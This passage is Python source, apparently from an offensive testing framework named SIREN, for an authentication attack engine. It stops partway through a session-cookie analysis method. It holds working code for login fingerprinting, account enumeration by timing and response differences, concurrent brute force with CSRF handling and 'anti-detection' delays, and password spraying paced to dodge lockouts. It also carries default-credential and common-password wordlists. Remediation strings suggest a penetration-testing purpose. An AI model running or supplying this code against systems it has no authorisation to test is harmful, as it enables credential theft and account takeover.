"""
SIREN — Authentication Attack Engine
=====================================
Shannon Intelligence Recon & Exploitation Nexus

Complete authentication attack engine:
- Login brute force with smart throttling
- Session analysis and hijacking
- OAuth/OIDC exploitation
- MFA bypass techniques
- Cookie manipulation and forgery
- SAML attack vectors
- Password spray and credential stuffing
- Session fixation and prediction
- Token replay and refresh abuse
- Account enumeration via timing/response analysis

Pure Python asyncio. No external tool dependencies.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import html
import json
import logging
import os
import random
import re
import string
import struct
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple, Union

logger = logging.getLogger("siren.auth_engine")


# ═══════════════════════════════════════════════════════════════
#  DATA MODELS
# ═══════════════════════════════════════════════════════════════


class AuthAttackType(Enum):
    BRUTE_FORCE = "brute_force"
    CREDENTIAL_STUFFING = "credential_stuffing"
    PASSWORD_SPRAY = "password_spray"
    SESSION_HIJACK = "session_hijack"
    SESSION_FIXATION = "session_fixation"
    SESSION_PREDICTION = "session_prediction"
    COOKIE_FORGE = "cookie_forge"
    OAUTH_EXPLOIT = "oauth_exploit"
    SAML_ATTACK = "saml_attack"
    MFA_BYPASS = "mfa_bypass"
    TOKEN_REPLAY = "token_replay"
    ACCOUNT_ENUM = "account_enum"
    RESET_POISON = "reset_poison"
    DEFAULT_CREDS = "default_creds"
    REGISTRATION_ABUSE = "registration_abuse"


class AuthMechanism(Enum):
    BASIC = "basic"
    DIGEST = "digest"
    BEARER = "bearer"
    FORM = "form"
    OAUTH2 = "oauth2"
    OIDC = "oidc"
    SAML = "saml"
    API_KEY = "api_key"
    NTLM = "ntlm"
    KERBEROS = "kerberos"
    CERTIFICATE = "certificate"
    CUSTOM = "custom"
    UNKNOWN = "unknown"


class SessionType(Enum):
    COOKIE = "cookie"
    JWT = "jwt"
    OPAQUE = "opaque"
    SIGNED = "signed"
    ENCRYPTED = "encrypted"
    UNKNOWN = "unknown"


class MFAType(Enum):
    TOTP = "totp"
    SMS = "sms"
    EMAIL = "email"
    PUSH = "push"
    HARDWARE = "hardware"
    BACKUP_CODE = "backup_code"
    NONE = "none"


@dataclass
class Credential:
    username: str
    password: str
    source: str = "wordlist"
    valid: bool = False
    response_time: float = 0.0
    status_code: int = 0
    response_length: int = 0
    extra: Dict[str, Any] = field(default_factory=dict)


@dataclass
class SessionToken:
    name: str
    value: str
    token_type: SessionType = SessionType.UNKNOWN
    entropy: float = 0.0
    predictable: bool = False
    expires: Optional[str] = None
    domain: Optional[str] = None
    path: str = "/"
    secure: bool = False
    httponly: bool = False
    samesite: str = "none"
    decoded: Optional[Dict[str, Any]] = None
    issues: List[str] = field(default_factory=list)


@dataclass
class AuthFingerprint:
    mechanism: AuthMechanism = AuthMechanism.UNKNOWN
    login_url: str = ""
    login_method: str = "POST"
    username_field: str = "username"
    password_field: str = "password"
    csrf_field: Optional[str] = None
    csrf_pattern: Optional[str] = None
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    lockout_threshold: int = 0
    lockout_duration: int = 0
    rate_limit: int = 0
    mfa_type: MFAType = MFAType.NONE
    session_tokens: List[str] = field(default_factory=list)
    extra_fields: Dict[str, str] = field(default_factory=dict)


@dataclass
class AuthAttackResult:
    attack_type: AuthAttackType
    success: bool = False
    target: str = ""
    details: str = ""
    credentials: List[Credential] = field(default_factory=list)
    sessions: List[SessionToken] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)
    duration: float = 0.0
    attempts: int = 0
    severity: str = "info"
    remediation: str = ""


# ═══════════════════════════════════════════════════════════════
#  WORDLISTS & DEFAULTS
# ═══════════════════════════════════════════════════════════════

DEFAULT_USERNAMES = [
    "admin",
    "administrator",
    "root",
    "user",
    "test",
    "guest",
    "info",
    "adm",
    "mysql",
    "postgres",
    "oracle",
    "ftp",
    "pi",
    "puppet",
    "ansible",
    "ec2-user",
    "vagrant",
    "azureuser",
    "deploy",
    "ubuntu",
    "centos",
    "support",
    "monitoring",
    "logging",
    "dev",
    "staging",
    "production",
    "backup",
    "operator",
    "manager",
    "superuser",
    "sysadmin",
    "webmaster",
    "postmaster",
    "hostmaster",
    "ssladmin",
    "firewall",
    "noc",
    "security",
    "audit",
    "compliance",
    "service",
    "daemon",
    "bin",
    "sys",
    "sync",
    "mail",
    "www-data",
    "nobody",
    "apache",
    "nginx",
    "tomcat",
]

DEFAULT_PASSWORDS = [
    "password",
    "123456",
    "12345678",
    "admin",
    "letmein",
    "welcome",
    "monkey",
    "master",
    "dragon",
    "login",
    "princess",
    "qwerty",
    "solo",
    "abc123",
    "1q2w3e4r",
    "111111",
    "iloveyou",
    "trustno1",
    "sunshine",
    "passw0rd",
    "shadow",
    "123123",
    "654321",
    "password1",
    "admin123",
    "root",
    "toor",
    "pass",
    "test",
    "guest",
    "changeme",
    "P@ssw0rd",
    "P@ssword1",
    "Welcome1",
    "Password123",
    "Summer2024",
    "Winter2024",
    "Spring2024",
    "Fall2024",
    "Company1",
    "Company123",
    "Qwerty123",
    "Admin@123",
    "P@ss1234",
    "Welcome@1",
    "Temp1234",
    "Default1",
]

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("test", "test"),
    ("guest", "guest"),
    ("user", "user"),
    ("user", "password"),
    ("demo", "demo"),
    ("admin", ""),
    ("root", ""),
    ("administrator", "administrator"),
    ("sa", ""),
    ("sa", "sa"),
    ("sa", "password"),
    ("postgres", "postgres"),
    ("mysql", "mysql"),
    ("oracle", "oracle"),
    ("mongo", "mongo"),
    ("redis", ""),
    ("elastic", "changeme"),
    ("kibana", "changeme"),
    ("admin", "changeme"),
    ("tomcat", "tomcat"),
    ("manager", "manager"),
    ("admin", "tomcat"),
    ("admin", "secret"),
    ("pi", "raspberry"),
    ("ubnt", "ubnt"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "default"),
    ("admin", "pass"),
    ("supervisor", "supervisor"),
    ("service", "service"),
]


# ═══════════════════════════════════════════════════════════════
#  AUTH FINGERPRINTER
# ═══════════════════════════════════════════════════════════════


class AuthFingerprinter:
    """Detect authentication mechanisms and login form structure."""

    CSRF_PATTERNS = [
        r'name=["\']?csrf[_-]?token["\']?\s+value=["\']([^"\']+)',
        r'name=["\']?_token["\']?\s+value=["\']([^"\']+)',
        r'name=["\']?authenticity_token["\']?\s+value=["\']([^"\']+)',
        r'name=["\']?__RequestVerificationToken["\']?\s+value=["\']([^"\']+)',
        r'name=["\']?csrfmiddlewaretoken["\']?\s+value=["\']([^"\']+)',
        r'name=["\']?_csrf["\']?\s+value=["\']([^"\']+)',
        r'name=["\']?nonce["\']?\s+value=["\']([^"\']+)',
        r'meta\s+name=["\']csrf-token["\']?\s+content=["\']([^"\']+)',
        r'meta\s+name=["\']_csrf["\']?\s+content=["\']([^"\']+)',
    ]

    USERNAME_PATTERNS = [
        r'name=["\']?(username|user|login|email|user_login|userid|user_id|'
        r'account|uname|u|usr|nickname|phone|mobile)["\']?',
    ]

    PASSWORD_PATTERNS = [
        r'name=["\']?(password|pass|passwd|pwd|secret|credential|'
        r'user_pass|user_password|login_password|p|pw)["\']?',
    ]

    LOGIN_URL_PATTERNS = [
        "/login",
        "/signin",
        "/sign-in",
        "/auth/login",
        "/authenticate",
        "/api/login",
        "/api/auth",
        "/api/v1/login",
        "/api/v1/auth",
        "/user/login",
        "/users/sign_in",
        "/account/login",
        "/session/new",
        "/sessions",
        "/oauth/token",
        "/wp-login.php",
        "/admin/login",
        "/admin/signin",
        "/auth",
        "/sso/login",
        "/cas/login",
    ]

    def __init__(self):
        self.fingerprints: Dict[str, AuthFingerprint] = {}

    async def fingerprint(
        self, target: str, http_client: Any = None
    ) -> AuthFingerprint:
        """Full authentication fingerprint of a target."""
        fp = AuthFingerprint()
        fp.login_url = target

        if http_client:
            try:
                resp = await self._fetch(http_client, target)
                if resp:
                    body = resp.get("body", "")
                    headers = resp.get("headers", {})
                    fp = await self._analyze_response(fp, body, headers, target)
            except Exception as e:
                logger.debug(f"Fingerprint fetch error: {e}")

        # Detect mechanism from URL patterns
        fp.mechanism = self._detect_mechanism(target, fp)

        self.fingerprints[target] = fp
        return fp

    async def _fetch(self, client: Any, url: str) -> Optional[Dict]:
        """Fetch URL using provided HTTP client."""
        try:
            if hasattr(client, "get"):
                resp = await client.get(url)
                return {
                    "body": getattr(resp, "text", "") or "",
                    "headers": dict(getattr(resp, "headers", {})),
                    "status": getattr(resp, "status_code", 0)
                    or getattr(resp, "status", 0),
                }
        except Exception as e:
            logger.debug("Auth fingerprint fetch error: %s", e)
        return None

    async def _analyze_response(
        self, fp: AuthFingerprint, body: str, headers: Dict, url: str
    ) -> AuthFingerprint:
        """Analyze HTTP response to detect auth details."""
        body_lower = body.lower()

        # Detect username field
        for pattern in self.USERNAME_PATTERNS:
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                fp.username_field = m.group(1)
                break

        # Detect password field
        for pattern in self.PASSWORD_PATTERNS:
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                fp.password_field = m.group(1)
                break

        # Detect CSRF token
        for pattern in self.CSRF_PATTERNS:
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                fp.csrf_field = self._extract_csrf_field_name(pattern)
                fp.csrf_pattern = pattern
                break

        # Detect form action
        form_match = re.search(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', body, re.IGNORECASE
        )
        if form_match:
            action = form_match.group(1)
            if action and not action.startswith("http"):
                from urllib.parse import urljoin

                action = urljoin(url, action)
            if action:
                fp.login_url = action

        # Detect form method
        method_match = re.search(
            r'<form[^>]*method=["\']([^"\']*)["\'][^>]*>', body, re.IGNORECASE
        )
        if method_match:
            fp.login_method = method_match.group(1).upper()

        # Detect additional hidden fields
        hidden_fields = re.findall(
            r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*'
            r'value=["\']([^"\']*)["\']',
            body,
            re.IGNORECASE,
        )
        for name, value in hidden_fields:
            if name.lower() not in (
                fp.username_field.lower(),
                fp.password_field.lower(),
            ):
                fp.extra_fields[name] = value

        # Detect MFA
        if any(
            kw in body_lower
            for kw in ["two-factor", "2fa", "mfa", "totp", "authenticator"]
        ):
            fp.mfa_type = MFAType.TOTP
        elif any(kw in body_lower for kw in ["sms code", "verification code", "otp"]):
            fp.mfa_type = MFAType.SMS

        # Detect failure indicators
        fail_patterns = [
            "invalid credentials",
            "login failed",
            "incorrect password",
            "authentication failed",
            "bad credentials",
            "wrong password",
            "invalid username",
            "account not found",
            "access denied",
            "unauthorized",
            "invalid login",
            "login error",
        ]
        for p in fail_patterns:
            if p in body_lower:
                fp.failure_indicators.append(p)

        # Detect success indicators from headers
        auth_header = headers.get("WWW-Authenticate", "")
        if "Bearer" in auth_header:
            fp.mechanism = AuthMechanism.BEARER
        elif "Basic" in auth_header:
            fp.mechanism = AuthMechanism.BASIC
        elif "Digest" in auth_header:
            fp.mechanism = AuthMechanism.DIGEST
        elif "NTLM" in auth_header:
            fp.mechanism = AuthMechanism.NTLM
        elif "Negotiate" in auth_header:
            fp.mechanism = AuthMechanism.KERBEROS

        # Detect rate limiting headers
        if "X-RateLimit-Limit" in headers:
            try:
                fp.rate_limit = int(headers["X-RateLimit-Limit"])
            except (ValueError, TypeError):
                pass
        if "Retry-After" in headers:
            try:
                fp.lockout_duration = int(headers["Retry-After"])
            except (ValueError, TypeError):
                pass

        # Detect session cookie names
        set_cookies = headers.get("Set-Cookie", "")
        if isinstance(set_cookies, str):
            set_cookies = [set_cookies]
        for cookie in set_cookies:
            name_match = re.match(r"([^=]+)=", cookie)
            if name_match:
                fp.session_tokens.append(name_match.group(1).strip())

        return fp

    def _extract_csrf_field_name(self, pattern: str) -> str:
        """Extract CSRF field name from regex pattern."""
        m = re.search(r"name=\[.*?\]?\??([a-zA-Z_-]+)", pattern)
        if m:
            return m.group(1)
        return "_token"

    def _detect_mechanism(self, url: str, fp: AuthFingerprint) -> AuthMechanism:
        """Detect auth mechanism from URL and fingerprint."""
        url_lower = url.lower()

        if fp.mechanism != AuthMechanism.UNKNOWN:
            return fp.mechanism

        if "/oauth" in url_lower or "/oauth2" in url_lower:
            return AuthMechanism.OAUTH2
        elif "/openid" in url_lower or "/oidc" in url_lower:
            return AuthMechanism.OIDC
        elif "/saml" in url_lower or "/sso" in url_lower:
            return AuthMechanism.SAML
        elif "/api/" in url_lower and ("/key" in url_lower or "/token" in url_lower):
            return AuthMechanism.API_KEY
        elif fp.username_field and fp.password_field:
            return AuthMechanism.FORM

        return AuthMechanism.UNKNOWN


# ═══════════════════════════════════════════════════════════════
#  ACCOUNT ENUMERATOR
# ═══════════════════════════════════════════════════════════════


class AccountEnumerator:
    """Enumerate valid accounts via timing, response size, and content analysis."""

    def __init__(self, fingerprint: AuthFingerprint):
        self.fp = fingerprint
        self.valid_users: List[str] = []
        self.timing_baseline: float = 0.0
        self.size_baseline: int = 0
        self.content_baseline: str = ""

    async def enumerate(
        self,
        usernames: List[str],
        http_client: Any = None,
        method: str = "timing",
    ) -> AuthAttackResult:
        """Enumerate valid accounts."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.ACCOUNT_ENUM,
            target=self.fp.login_url,
        )
        start = time.time()

        if not http_client:
            result.details = "No HTTP client provided"
            return result

        # Establish baseline with known-invalid user
        baseline_user = f"siren_invalid_{random.randint(100000, 999999)}"
        baseline = await self._attempt_login(
            http_client, baseline_user, "InvalidP@ss123!"
        )

        if baseline:
            self.timing_baseline = baseline.response_time
            self.size_baseline = baseline.response_length
            self.content_baseline = baseline.extra.get("body", "")

        # Test each username
        for username in usernames:
            try:
                cred = await self._attempt_login(
                    http_client, username, "InvalidP@ss123!"
                )
                if not cred:
                    continue

                is_valid = False

                if method == "timing":
                    # Significant timing difference suggests valid user
                    if self.timing_baseline > 0:
                        ratio = cred.response_time / self.timing_baseline
                        if ratio > 1.5 or ratio < 0.5:
                            is_valid = True

                elif method == "size":
                    # Different response size suggests valid user
                    if self.size_baseline > 0:
                        diff = abs(cred.response_length - self.size_baseline)
                        if diff > 50:
                            is_valid = True

                elif method == "content":
                    # Different error message suggests valid user
                    body = cred.extra.get("body", "")
                    if body != self.content_baseline:
                        is_valid = True

                elif method == "status":
                    # Different status code
                    if cred.status_code != baseline.status_code:
                        is_valid = True

                elif method == "all":
                    # Combine all methods
                    score = 0
                    if self.timing_baseline > 0:
                        ratio = cred.response_time / self.timing_baseline
                        if ratio > 1.3 or ratio < 0.7:
                            score += 1
                    if self.size_baseline > 0:
                        diff = abs(cred.response_length - self.size_baseline)
                        if diff > 20:
                            score += 1
                    body = cred.extra.get("body", "")
                    if body != self.content_baseline:
                        score += 1
                    if cred.status_code != baseline.status_code:
                        score += 1
                    if score >= 2:
                        is_valid = True

                if is_valid:
                    cred.valid = True
                    cred.source = f"enum_{method}"
                    self.valid_users.append(username)
                    result.credentials.append(cred)

                result.attempts += 1

                # Anti-detection delay
                await asyncio.sleep(random.uniform(0.1, 0.5))

            except Exception as e:
                logger.debug(f"Enum error for {username}: {e}")

        result.success = len(self.valid_users) > 0
        result.duration = time.time() - start
        result.details = (
            f"Enumerated {len(usernames)} usernames, "
            f"found {len(self.valid_users)} valid accounts"
        )
        result.severity = "high" if result.success else "info"
        result.remediation = (
            "Ensure identical responses for valid and invalid usernames. "
            "Use generic error messages. Implement consistent timing."
        )
        return result

    async def _attempt_login(
        self, client: Any, username: str, password: str
    ) -> Optional[Credential]:
        """Attempt a single login and measure response."""
        cred = Credential(username=username, password=password)

        try:
            data = {
                self.fp.username_field: username,
                self.fp.password_field: password,
            }
            data.update(self.fp.extra_fields)

            start = time.time()

            if hasattr(client, "post"):
                resp = await client.post(
                    self.fp.login_url,
                    data=data,
                    allow_redirects=False,
                )
                cred.response_time = time.time() - start
                cred.status_code = getattr(resp, "status_code", 0) or getattr(
                    resp, "status", 0
                )

                body = ""
                if hasattr(resp, "text"):
                    body = (
                        resp.text if isinstance(resp.text, str) else await resp.text()
                    )
                cred.response_length = len(body)
                cred.extra["body"] = body[:2000]

            return cred

        except Exception as e:
            logger.debug(f"Login attempt error: {e}")
            return None


# ═══════════════════════════════════════════════════════════════
#  BRUTE FORCE ENGINE
# ═══════════════════════════════════════════════════════════════


class BruteForceEngine:
    """Advanced brute force with smart throttling and lockout detection."""

    def __init__(
        self,
        fingerprint: AuthFingerprint,
        concurrency: int = 5,
        delay_range: Tuple[float, float] = (0.5, 2.0),
        max_attempts_per_user: int = 50,
        lockout_detection: bool = True,
    ):
        self.fp = fingerprint
        self.concurrency = concurrency
        self.delay_range = delay_range
        self.max_attempts = max_attempts_per_user
        self.lockout_detection = lockout_detection
        self.found_credentials: List[Credential] = []
        self.locked_accounts: Set[str] = set()
        self._semaphore = asyncio.Semaphore(concurrency)
        self._stop = False
        self._attempt_count = 0
        self._lockout_indicators = [
            "account locked",
            "too many attempts",
            "temporarily blocked",
            "account disabled",
            "try again later",
            "rate limit",
            "maximum attempts",
            "account suspended",
            "locked out",
            "captcha",
            "verify you are human",
            "security check",
        ]

    async def brute_force(
        self,
        usernames: List[str],
        passwords: List[str],
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Run brute force attack against login endpoint."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.BRUTE_FORCE,
            target=self.fp.login_url,
        )
        start = time.time()

        if not http_client:
            result.details = "No HTTP client provided — dry run mode"
            # Generate credential pairs for dry run
            for u in usernames[:5]:
                for p in passwords[:5]:
                    result.credentials.append(
                        Credential(username=u, password=p, source="dry_run")
                    )
            result.attempts = len(result.credentials)
            result.duration = time.time() - start
            return result

        tasks = []
        for username in usernames:
            if self._stop:
                break
            for password in passwords[: self.max_attempts]:
                if self._stop:
                    break
                if username in self.locked_accounts:
                    break
                tasks.append(self._try_credential(http_client, username, password))

        # Execute with concurrency control
        for batch_start in range(0, len(tasks), self.concurrency * 2):
            if self._stop:
                break
            batch = tasks[batch_start : batch_start + self.concurrency * 2]
            results = await asyncio.gather(*batch, return_exceptions=True)
            for r in results:
                if isinstance(r, Credential):
                    result.attempts += 1
                    if r.valid:
                        self.found_credentials.append(r)
                        result.credentials.append(r)
                elif isinstance(r, Exception):
                    logger.debug(f"Brute force error: {r}")

        result.success = len(self.found_credentials) > 0
        result.duration = time.time() - start
        result.attempts = self._attempt_count
        result.details = (
            f"Tested {self._attempt_count} credential pairs, "
            f"found {len(self.found_credentials)} valid credentials, "
            f"{len(self.locked_accounts)} accounts locked"
        )
        result.severity = "critical" if result.success else "info"
        result.remediation = (
            "Implement account lockout after failed attempts. "
            "Use CAPTCHA after multiple failures. "
            "Enforce strong password policies. "
            "Implement progressive delays."
        )
        return result

    async def _try_credential(
        self, client: Any, username: str, password: str
    ) -> Credential:
        """Try a single credential pair."""
        async with self._semaphore:
            cred = Credential(
                username=username, password=password, source="brute_force"
            )
            self._attempt_count += 1

            try:
                # Anti-detection delay
                await asyncio.sleep(random.uniform(*self.delay_range))

                # Get fresh CSRF token if needed
                csrf_value = ""
                if self.fp.csrf_pattern:
                    csrf_value = await self._get_csrf_token(client)

                # Build request data
                data = {
                    self.fp.username_field: username,
                    self.fp.password_field: password,
                }
                if self.fp.csrf_field and csrf_value:
                    data[self.fp.csrf_field] = csrf_value
                data.update(self.fp.extra_fields)

                # Send login request
                start = time.time()
                if hasattr(client, "post"):
                    resp = await client.post(
                        self.fp.login_url,
                        data=data,
                        allow_redirects=False,
                    )
                    cred.response_time = time.time() - start
                    cred.status_code = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )

                    body = ""
                    if hasattr(resp, "text"):
                        body = (
                            resp.text
                            if isinstance(resp.text, str)
                            else await resp.text()
                        )
                    cred.response_length = len(body)

                    # Check for lockout
                    if self.lockout_detection:
                        body_lower = body.lower()
                        for indicator in self._lockout_indicators:
                            if indicator in body_lower:
                                self.locked_accounts.add(username)
                                logger.warning(
                                    f"Account lockout detected for {username}"
                                )
                                break

                    # Check for successful login
                    cred.valid = self._is_login_success(
                        cred.status_code, body, dict(getattr(resp, "headers", {}))
                    )

                    if cred.valid:
                        logger.info(f"Valid credential found: {username}:{password}")
                        # Extract session tokens
                        headers = dict(getattr(resp, "headers", {}))
                        cred.extra["cookies"] = headers.get("Set-Cookie", "")

            except Exception as e:
                logger.debug(f"Credential test error: {e}")
                cred.extra["error"] = str(e)

            return cred

    async def _get_csrf_token(self, client: Any) -> str:
        """Fetch a fresh CSRF token."""
        try:
            if hasattr(client, "get"):
                resp = await client.get(self.fp.login_url)
                body = ""
                if hasattr(resp, "text"):
                    body = (
                        resp.text if isinstance(resp.text, str) else await resp.text()
                    )
                if self.fp.csrf_pattern:
                    m = re.search(self.fp.csrf_pattern, body, re.IGNORECASE)
                    if m:
                        return m.group(1)
        except Exception as e:
            logger.debug("CSRF token extraction error: %s", e)
        return ""

    def _is_login_success(
        self, status: int, body: str, headers: Dict[str, str]
    ) -> bool:
        """Determine if login was successful."""
        body_lower = body.lower()

        # Redirect to dashboard/home = success
        if status in (301, 302, 303, 307, 308):
            location = headers.get("Location", "").lower()
            if any(
                kw in location
                for kw in [
                    "dashboard",
                    "home",
                    "profile",
                    "account",
                    "welcome",
                    "panel",
                    "admin",
                    "main",
                    "index",
                ]
            ):
                return True
            # Redirect back to login = failure
            if any(kw in location for kw in ["login", "signin", "error", "failed"]):
                return False
            return True  # Generic redirect likely success

        # 200 with success indicators
        if status == 200:
            for indicator in self.fp.success_indicators:
                if indicator.lower() in body_lower:
                    return True
            # Check for absence of failure indicators
            for indicator in self.fp.failure_indicators:
                if indicator.lower() in body_lower:
                    return False
            # If we have failure indicators defined and none matched, might be success
            if self.fp.failure_indicators and status == 200:
                return True

        # Session cookie set = likely success
        if "Set-Cookie" in headers:
            cookie = headers["Set-Cookie"].lower()
            if any(name.lower() in cookie for name in self.fp.session_tokens):
                return True

        return False


# ═══════════════════════════════════════════════════════════════
#  PASSWORD SPRAYER
# ═══════════════════════════════════════════════════════════════


class PasswordSprayer:
    """Spray single passwords across many accounts to avoid lockout."""

    def __init__(
        self,
        fingerprint: AuthFingerprint,
        spray_delay: float = 30.0,
        jitter: float = 5.0,
    ):
        self.fp = fingerprint
        self.spray_delay = spray_delay
        self.jitter = jitter
        self.found: List[Credential] = []

    async def spray(
        self,
        usernames: List[str],
        passwords: List[str],
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Spray passwords — one password per round across all users."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.PASSWORD_SPRAY,
            target=self.fp.login_url,
        )
        start = time.time()

        brute = BruteForceEngine(
            self.fp,
            concurrency=3,
            delay_range=(0.5, 1.5),
            lockout_detection=True,
        )

        for password in passwords:
            logger.info(f"Spraying password: {password[:3]}***")

            for username in usernames:
                cred = (
                    await brute._try_credential(http_client, username, password)
                    if http_client
                    else Credential(
                        username=username, password=password, source="spray_dry"
                    )
                )

                result.attempts += 1

                if cred.valid:
                    self.found.append(cred)
                    result.credentials.append(cred)

                # Small delay between users
                await asyncio.sleep(random.uniform(0.1, 0.5))

            # Long delay between password rounds to avoid lockout
            if password != passwords[-1]:
                delay = self.spray_delay + random.uniform(-self.jitter, self.jitter)
                logger.info(f"Spray round complete. Waiting {delay:.1f}s")
                await asyncio.sleep(delay)

        result.success = len(self.found) > 0
        result.duration = time.time() - start
        result.details = (
            f"Sprayed {len(passwords)} passwords across {len(usernames)} users, "
            f"found {len(self.found)} valid"
        )
        result.severity = "critical" if result.success else "info"
        result.remediation = (
            "Implement account lockout policies. "
            "Use IP-based rate limiting. "
            "Deploy MFA for all accounts."
        )
        return result


# ═══════════════════════════════════════════════════════════════
#  SESSION ANALYZER
# ═══════════════════════════════════════════════════════════════


class SessionAnalyzer:
    """Analyze session tokens for weaknesses."""

    def __init__(self):
        self.tokens: List[SessionToken] = []
        self.entropy_samples: List[float] = []

    async def analyze_session(
        self,
        target: str,
        http_client: Any = None,
        sample_count: int = 20,
    ) -> AuthAttackResult:
        """Collect and analyze session tokens."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.SESSION_HIJACK,
            target=target,
        )
        start = time.time()

        # Collect multiple session tokens
        raw_tokens: List[Dict[str, str]] = []
        for i in range(sample_count):
            token_set = await self._collect_session(target, http_client)
            if token_set:
                raw_tokens.append(token_set)
            await asyncio.sleep(random.uniform(0.1, 0.3))

        if not raw_tokens:
            result.details = "Could not collect session tokens"
            result.duration = time.time() - start
            return result

        # Analyze each token name across samples
        token_names = set()
        for ts in raw_tokens:
            token_names.update(ts.keys())

        for name in token_names:
            values = [ts.get(name, "") for ts in raw_tokens if name in ts]
            if not values:
                continue

            token = SessionToken(name=name, value=values[0])

            # Detect token type
            token.token_type = self._detect_type(values[0])

            # Calculate entropy
            token.entropy = self._calculate_entropy(values[0])

            # Check predictability
            token.predictable = self._check_predictability(values)

            # Analyze security flags from raw cookie string
            token.issues = self._analyze_flags(name, values[0])

            # Try to decode
            token.decoded = self._try_decode(values[0])

            self.tokens.append(token)
            result.sessions.append(token)

        # Assess vulnerabilities
        issues = []
        for token in self.tokens:
            if token.predictable:
                issues.append(f"Token '{token.name}' is predictable")
            if token.entropy < 64:
                issues.append(
                    f"Token '{token.name}' has low entropy ({token.entropy:.1f} bits)"
                )
            if not token.httponly:
                issues.append(f"Token '{token.name}' missing HttpOnly flag")
            if not token.secure:
                issues.append(f"Token '{token.name}' missing Secure flag")
            if token.samesite.lower() == "none":
                issues.append(f"Token '{token.name}' has SameSite=None")

        result.success = len(issues) > 0
        result.details = (
            f"Analyzed {len(self.tokens)} session tokens, found {len(issues)} issues"
        )
        result.evidence["issues"] = issues
        result.evidence["token_analysis"] = [
            {
                "name": t.name,
                "type": t.token_type.value,
                "entropy": t.entropy,
                "predictable": t.predictable,
                "secure": t.secure,
                "httponly": t.httponly,
                "issues": t.issues,
            }
            for t in self.tokens
        ]
        result.duration = time.time() - start
        result.severity = (
            "high"
            if any(t.predictable for t in self.tokens)
            else ("medium" if issues else "info")
        )
        result.remediation = (
            "Use cryptographically random session IDs with at least 128 bits of entropy. "
            "Set HttpOnly, Secure, and SameSite flags on all session cookies. "
            "Implement session rotation after authentication."
        )
        return result

    async def _collect_session(
        self, target: str, client: Any
    ) -> Optional[Dict[str, str]]:
        """Collect session tokens from a single request."""
        if not client:
            return None
        try:
            if hasattr(client, "get"):
                resp = await client.get(target)
                headers = dict(getattr(resp, "headers", {}))
                cookies = {}

                # Parse Set-Cookie headers
                set_cookies = headers.get("Set-Cookie", "")
                if isinstance(set_cookies, str):
                    set_cookies = [set_cookies]

                for cookie_str in set_cookies:
                    parts = cookie_str.split(";")
                    if parts:
                        name_val = parts[0].strip().split("=", 1)
                        if len(name_val) == 2:
                            cookies[name_val[0].strip()] = name_val[1].strip()

                return cookies if cookies else None

        except Exception as e:
            logger.debug("Session cookie collection error: %s", e)
        return None

    def _detect_type(self, value: str) -> SessionType:
        """Detect session token type."""
        # JWT pattern
        parts = value.split(".")
        if len(parts) == 3:
            try:
                # Try to base64-decode header
                header = parts[0] + "=" * (4 - len(parts[0]) % 4)
                decoded = base64.urlsafe_b64decode(header)
                data = json.loads(decoded)
                if "alg" in data or "typ" in data:
                    return SessionType.JWT
            except Exception:
                pass

        # Hex-encoded (typical opaque tokens)
        if re.match(r"^[0-9a-fA-F]+$", value) and len(value) >= 16:
            return SessionType.OPAQUE

        # Base64-encoded with signature
        if "." in value or "--" in value:
            return SessionType.SIGNED

        # Check if base64 encoded
        try:
            decoded = base64.b64decode(value + "=" * (4 - len(value) % 4))
            if all(32 <= b < 127 for b in decoded[:20]):
                return SessionType.SIGNED
        except Exception:
            pass

        return SessionType.UNKNOWN

    def _calculate_entropy(self, value: str) -> float:
        """Calculate Shannon entropy of a token value."""
        if not value:
            return 0.0

        import math

        freq: Dict[str, int] = {}
        for char in value:
            freq[char] = freq.get(char, 0) + 1

        entropy = 0.0
        length = len(value)
        for count in freq.values():
            prob = count / length
            if prob > 0:
                entropy -= prob * math.log2(prob)

        # Total entropy in bits
        return entropy * length

    def _check_predictability(self, values: List[str]) -> bool:
        """Check if token values are predictable (sequential, time-based, etc)."""
        if len(values) < 3:
            return False

        # Check for sequential patterns
        try:
            numeric_values = [
                int(v, 16) if all(c in "0123456789abcdefABCDEF" for c in v) else None
                for v in values
            ]
            numeric_values = [n for n in numeric_values if n is not None]

            if len(numeric_values) >= 3:
                diffs = [
                    numeric_values[i + 1] - numeric_values[i]
                    for i in range(len(numeric_values) - 1)
                ]
                # Check if differences are constant (sequential)
                if len(set(diffs)) == 1:
                    return True
                # Check if differences are very small (time-based with low resolution)
                if all(abs(d) < 1000 for d in diffs):
                    return True
        except (ValueError, TypeError):
            pass

        # Check for identical tokens (no randomness)
        if len(set(values)) == 1:
            return True

        # Check for common prefix/suffix (weak randomness)
        if len(values) >= 5:
            prefix_len = 0
            for i in range(min(len(v) for v in values)):
                if len(set(v[i] for v in values)) == 1:
                    prefix_len += 1
                else:
                    break
            suffix_len = 0
            for i in range(1, min(len(v) for v in values) + 1):
                if len(set(v[-i] for v in values)) == 1:
                    suffix_len += 1
                else:
                    break
            total_len = min(len(v) for v in values)
            random_portion = total_len - prefix_len - suffix_len
            if random_portion < total_len * 0.3:
                return True

        return False

    def _analyze_flags(self, name: str, raw_cookie: str) -> List[str]:
        """Analyze cookie security flags."""
        issues = []
        raw_lower = raw_cookie.lower()

        # These would be checked from the full Set-Cookie header
        # For now, check common session cookie names
        session_names = [
            "sessionid",
            "session_id",
            "sessid",
            "phpsessid",
            "jsessionid",
